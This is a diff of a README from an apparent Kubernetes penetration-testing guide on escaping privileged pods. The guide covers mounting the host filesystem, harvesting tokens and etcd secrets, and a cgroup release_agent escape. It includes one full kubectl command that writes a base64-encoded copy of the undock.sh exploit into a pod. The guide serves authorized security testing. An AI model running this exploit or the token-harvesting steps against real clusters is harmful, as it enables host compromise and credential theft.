@@ -1,34 +1,35 @@
 # Bad Pod #3: Privileged
 
 If you only have `privileged: true`, there are two paths you can take: 
+
+* **Mount the host’s filesystem** – In privileged mode, /dev on the host is accessible in your pod.  You can mount the disk that contains the host’s filesystem into your pod using the mount command. In my experience, this gives you a limited view of the filesystem though. Some files, and therefore privesc paths, are not accessible from your privileged pod unless you escalate to a full shell on the node. That said, it is easy enough that you might as well mount the device and see what you can see.  
 * **Exploit cgroup usermode helper programs** – Your best bet is to get interactive root access on the node, but you must jump through a few hoops first. You can use Felix Wilhelm's exploit PoC `undock.sh` to execute one command a time, or you can use Brandon Edwards and Nick Freeman’s version  from their talk A Compendium of Container Escapes, which forces the host to connect back to the a listener on the pod for an easy upgrade to interactive root access on the host. Another option is to use the Metasploit module docker privileged container escape which uses the same exploit to upgrade a shell received from a container to a shell on the host. 
 
 Once you get an interactive shell, the Kubernetes privilege escalation paths are the largely the same as the [Bad Pod #2: Everything-allowed](../priv-and-hostpid/README.md). 
 
-* **Mount the host’s filesystem** – You can also skip the RCE path and mount the host’s filesystem into your pod using the mount command. In my experience, this gives you a limited view of the filesystem. Some files, and therefore privesc paths, are not accessible from your privileged pod unless you escalate to a full shell on the node. 
+
 
 ## Table of Contents 
 - [Pod creation & access](#pod-creation--access)
   - [Exec pods](#exec-pods)
   - [Reverse shell pods](#reverse-shell-pods)
   - [Deleting resources](#deleting-resources)
-- [Post exploitation](#post-exploitation)  
-  - [Remote code execution](#remote-code-execution)
-    - [Option 1: Use Felix Wilhelm's undock.sh and hunt around with non-interactive access](#option-1-use-felix-wilhelms-undocksh-and-hunt-around-with-non-interactive-access)
-    - [Option 2: Use Brandon Edwards and Nick Freeman’s version which upgrades you to an interactive shell](#option-2-use-brandon-edwards-and-nick-freemans-version-which-upgrades-you-to-an-interactive-shell)
-    - [Option 3: Use the metasploit module: docker_privileged_container_escape](#option-3-use-the-metasploit-module-docker_privileged_container_escape)
-    - [Option 4: Use undock.sh to download your own payload and then execute it spawn the reverse shell](#option-4-use-undocksh-to-download-your-own-payload-and-then-execute-it-spawn-the-reverse-shell)
-  - [Mount the host's filesystem](#mount-the-hosts-filesystem)
-    - [Can you run your pod on a control-plane node](#can-you-run-your-pod-on-a-control-plane-node)
+- [Post exploitation](#post-exploitation)
+  - [Can you run your pod on a control-plane node](#can-you-run-your-pod-on-a-control-plane-node)
+  - [Option 1: Mount the host's filesystem](#option-1-mount-the-hosts-filesystem)
       - [Read secrets from etcd](#read-secrets-from-etcd)
     - [Look for kubeconfigs in the host filesystem](#look-for-kubeconfigs-in-the-host-filesystem)
     - [Grab all tokens from all pods on the system](#grab-all-tokens-from-all-pods-on-the-system)
-  - [What to look for on a node](#what-to-look-for-on-a-node)
+  - [Remote code execution](#remote-code-execution)
+    - [Option 1: Use Felix Wilhelm's undock.sh and hunt around with non-interactive access](#option-1-use-felix-wilhelms-undocksh-and-hunt-around-with-non-interactive-access)      
+    - [Option 2: Use Brandon Edwards and Nick Freeman’s version which upgrades you to an interactive shell](#option-2-use-brandon-edwards-and-nick-freemans-version-which-upgrades-you-to-an-interactive-shell)
+    - [Option 3: Use the metasploit module: docker_privileged_container_escape](#option-3-use-the-metasploit-module-docker_privileged_container_escape)
+    - [Option 4: Use undock.sh to download your own payload and then execute it spawn the reverse shell](#option-4-use-undocksh-to-download-your-own-payload-and-then-execute-it-spawn-the-reverse-shell)
+    - [Grab all tokens from all pods on the system](#grab-all-tokens-from-all-pods-on-the-system-1)
   - [Some other ideas](#some-other-ideas)
   - [Attacks that apply to all pods, even without any special permissions](#attacks-that-apply-to-all-pods-even-without-any-special-permissions)
 - [Demonstrate impact](#demonstrate-impact)
 - [References and further reading:](#references-and-further-reading)
-- 
 # Pod creation & access
 
 ## Exec pods
@@ -117,7 +118,7 @@ kubectl delete cronjob priv-exec-cronjob
 ```
 # Post exploitation
 
-### Can you run your pod on a control-plane node
+## Can you run your pod on a control-plane node
 *This is not a possible on cloud managed Kubernetes clusters like GKE and EKS - they hide the control-plane.*
 
 The pod you created above was likely scheduled on a worker node. Before jumping into post exploitation on the worker node, it is worth seeing if you run your a pod on a control-plane node. If you can run your pod on a control-plane node using the nodeName selector in the pod spec, you might have easy access to the etcd database, which contains all of the configuration for the cluster, including all secrets. 
@@ -377,17 +378,18 @@ k8s-worker
 
 ### Grab all tokens from all pods on the system
 
-You can access any secret mounted within any pod on the node you are on. In a production cluster, even on a worker node, there is usually at least one pod that has a mounted *token* that is bound to a *service account* that is bound to a *clusterrolebinding*, that gives you access to do things like create pods or view secrets in all namespaces. 
+You can access any secret mounted within any pod on the node you are on. In a production cluster, even on a worker node, there is usually at least one pod that has a mounted *token* that is bound to a *service account* that is bound to a *clusterrolebinding*, that gives you access to do things like create pods or view secrets in all namespaces. Look for tokens that have permissions to get secrets in kube-system. 
 
-Look for tokens that have permissions to get secrets in kube-system. The examples below automate this process for you a bit:
+The examples below automate this process for you a bit:
 
 **If you haven't already, drop the undock.sh script into on your pod.** 
-The file will be at /undock.sh: 
+
+The file will be at /undock.sh and is needed to make the next examples work from outside the pod using `kubectl exec`.: 
 ```
 kubectl exec -it priv-exec-pod -- bash -c "echo ZD1gZGlybmFtZSAkKGxzIC14IC9zKi9mcy9jKi8qL3IqIHxoZWFkIC1uMSlgCm1rZGlyIC1wICRkL3c7ZWNobyAxID4kZC93L25vdGlmeV9vbl9yZWxlYXNlCnQ9YHNlZCAtbiAncy8uKlxwZXJkaXI9XChbXixdKlwpLiovXDEvcCcgL2V0Yy9tdGFiYAp0b3VjaCAvbzsgZWNobyAkdC9jID4kZC9yZWxlYXNlX2FnZW50O2VjaG8gIiMhL2Jpbi9zaAokMSA+JHQvbyIgPi9jO2NobW9kICt4IC9jO3NoIC1jICJlY2hvIDAgPiRkL3cvY2dyb3VwLnByb2NzIjtzbGVlcCAxO2NhdCAvbwo= | base64 -d > /undock.sh" 
 ```
 
-This is needed to make the next examples work from outside the pod using `kubectl exec`.
+
 
 
 **Run kubectl can-i --list against ALL tokens found on the node**
